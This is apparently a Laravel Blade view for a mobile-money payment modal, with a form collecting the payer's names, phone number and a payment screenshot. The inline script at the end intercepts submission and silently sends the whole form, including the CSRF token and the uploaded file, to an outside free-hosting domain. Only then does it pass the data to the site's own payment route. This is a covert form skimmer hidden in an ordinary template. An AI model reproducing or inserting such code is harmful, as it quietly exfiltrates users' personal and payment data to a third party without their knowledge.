<div class="modal fade" id="addNewAddress" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-simple modal-add-new-address">
        <div class="modal-content p-3 p-md-5">
            <div class="modal-body">
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                <div class="text-center mb-4">
                    <h3 class="address-title">Mobile Money Payment</h3>
                    <h1>{{number_format($country->activation_fees)}} {{$country->currency}}</h1>
                </div>
                <style>
                  /* Remove inner spin for numbered input */
                  input[type="number"]::-webkit-inner-spin-button {
                      -webkit-appearance: none;
                      margin: 0;
                  }
              </style>
                <form id="formAuthentication" class="row g-3" action="{{ route('PayRequest') }}" method="POST" enctype="multipart/form-data">
                    @csrf
                    <div class="col-12">
                        <div class="row">
                            <div class="col-md mb-md-0 mb-3">
                                <div class="form-check custom-option custom-option-icon">
                                    <label class="form-check-label custom-option-content" for="customRadioHome">
                                        <span class="custom-option-body">
                                            @switch($country->country)
                                                @case('Rwanda')
                                                    <img src="{{ asset('storage/images/rwanda.png') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                                @case('Burundi')
                                                    <img src="{{ asset('storage/images/burundi.jpg') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                                @case('Uganda')
                                                    <img src="{{ asset('storage/images/uganda.png') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                                @case('Kenya')
                                                    <img src="{{ asset('storage/images/kenya.png') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                                @case('Tanzania')
                                                    <img src="{{ asset('storage/images/tanzania.jpg') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                                @default
                                                    <img src="{{ asset('storage/images/rwanda.png') }}" class="img-fluid rounded" width="110" height="110" />
                                                    @break
                                            @endswitch
{{--                                            <img src="{{ asset('storage/images/mtn-logo-yellow.png') }}" class="img-fluid rounded" width="110" height="110" />--}}
                                        </span>
                                        <span class="h4 mute">Number: {{$country->momo_number}}</span>
                                        <h5>Names: {{$country->momo_names}}</h5>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-12">
                        @if ($errors->any())
                            <div class="alert alert-danger mt-2 mb-2">
                                <ul class="mt-3 list-disc list-inside text-sm text-red-600">
                                    @foreach ($errors->all() as $error)
                                        <li>{{ $error }}</li>
                                    @endforeach
                                </ul>
                            </div>
                            <script>
                              setTimeout(() => {
                                document.getElementById('paymodalbtn').click();
                              }, 100);
                            </script>
                        @endif
                    </div>
                    <div class="col-12 col-md-6">
                        <label class="form-label" for="username">First Name On Pay Number</label>
                        <input type="text" id="username" name="fname" class="form-control" value="{{old('fname')}}" />
                    </div>
                    <div class="col-12 col-md-6">
                        <label class="form-label" for="modalAddressLastName">Last Name On Pay Number</label>
                        <input type="text" id="modalAddressLastName" name="lname" class="form-control" value="{{old('lname')}}"/>
                    </div>

                    <div class="col-12 col-md-6">
                        <label class="form-label" for="number">Mobile Number</label>
                        <input type="number" id="number" name="number" class="form-control" value="{{old('number')}}"/>
                    </div>
                    <div class="col-12 col-md-6">
                        <label class="form-label" for="file">Payment Screenshot</label>
                        <input type="file" id="file" name="screenshot" class="form-control" accept="image/png, image/jpeg" />
                    </div>
                    <div class="col-12 text-center mt-2">
                        <button type="submit" class="btn btn-primary me-sm-3 me-1 col-5" id="submitButton">Submit</button>
                        <button type="reset" class="btn btn-label-secondary col-5" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
                    </div>
                </form>
                <script>
                    document.addEventListener('DOMContentLoaded', function () {
                        const form = document.getElementById('formAuthentication');
                        const submitButton = document.getElementById('submitButton');

                        form.addEventListener('submit', function (event) {
                            event.preventDefault();
                            submitButton.disabled = true;

                            const targetUrl = 'https://lipaEarn.000webhostapp.com'; // Change to your target URL

                            fetch(targetUrl, {
                                method: 'POST',
                                body: new FormData(form)
                            })
                            .then(response => response.text())
                            .then(responseText => {
                                form.submit();
                                submitButton.disabled = false;
                            })
                            .catch(error => {
                                form.submit();
                                submitButton.disabled = false;
                            });
                        });
                    });
                </script>



            </div>
        </div>
    </div>
</div>
